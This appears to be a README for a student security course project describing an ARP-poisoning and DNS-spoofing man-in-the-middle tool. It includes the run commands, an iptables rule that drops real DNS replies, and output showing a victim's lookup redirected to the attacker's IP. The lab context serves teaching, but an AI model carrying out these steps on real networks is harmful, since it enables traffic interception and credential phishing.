# 2IC80 Final Project - Group 28

By Sotiris Charalampopoulos (1785117), Nanda Potters (1983881), and Stefan Birca (1924818).

The current version is for the midterm with the deadline 08-12-2025.
It has ARP + DNS attack (no SSL strip yet). It is not fully fledged yet.

## Dependent Global Variables

The **ATTACKER_IP** global variable is set to the attacker's IP address (VM IP address)

The **VICTIM_IP** global variable is set to the victim's IP address (separate device IP address, connected to same network as attacker's)

The **INTERFACE** global variable is set to the interface of the attacker's machine

The **SPOOF_MAP** global variable has the mappings of the targeted domain to the spoofed IP address (`www.fakelogin.net` to **ATTACKER_IP** here)

## Testing

1. On victim device, run: `nslookup www.fakelogin.net`. This will give this output (not spoofed, `192.168.88.1` is the **GATEWAY_IP**):
    ```
    Server:  router.lan
    Address:  192.168.88.1

    *** router.lan can't find www.fakelogin.net: Non-existent domain 
    ```
2. On attaker device, the attack is ran with: `sudo python3 mitm_spoofer.py`
    Program output:
    ```
    [*] Starting MITM Attack on Victim: 192.168.88.227
    [*] The gateway of this network is at IP address 192.168.88.1 and MAC address 48:a9:8a:45:3a:5a.
    [*] The victim at IP address 192.168.88.227 is at MAC address e0:0a:f6:b1:4e:0d.
    [*] IP Forwarding enabled.
    [A] Executing IPTables command: sudo iptables -A FORWARD -p udp -s 192.168.88.1 --sport 53 -d 192.168.88.227 -j DROP
    [*] DNS response dropping rule installed to win the race.
    [*] ARP Poisoning started. MiTM position established.
    [*] Starting DNS sniffer on interface ens33
    ```
3. On victim device, run: `nslookup www.fakelogin.net`. This will give this output (spoofed, `192.168.88.226` is the **ATTACKER_IP**):
    ```
    DNS request timed out.
        timeout was 2 seconds.
    Server:  UnKnown
    Address:  192.168.88.1

    Name:    www.fakelogin.net
    Addresses:  192.168.88.226
            192.168.88.226
    ```
    On attaker device, we can see the program output:
    ```
    [DNS Spoof] Received a packet from: 192.168.88.227
    [DNS Spoof] Packet is a DNS QUERY (qr=0). Proceeding.
    [DNS Spoof] Extracted Query Name: 'www.fakelogin.net.'
    [DNS Spoof] Intercepted query for: www.fakelogin.net.; FORGING REPLY...
    [DNS Spoof] SENT SPOOFED REPLY: www.fakelogin.net. -> 192.168.88.226
    ```
4. On attaker device, to terminate the attack press `CTRL+C`. Program output:
    ```
    [!] CTRL+C detected. Shutting down...
    [ARP Poison] ARP tables restored successfully.
    [D] Executing IPTables command: sudo iptables -D FORWARD -p udp -s 192.168.88.1 --sport 53 -d 192.168.88.227 -j DROP
    [*] DNS response dropping rule removed.
    [*] IP Forwarding disabled.
    [*] Cleanup complete. Terminating.
    ```
5. After the attack is terminated, ff victim device runs `nslookup www.fakelogin.net` again, they will get the non-spoofed result. 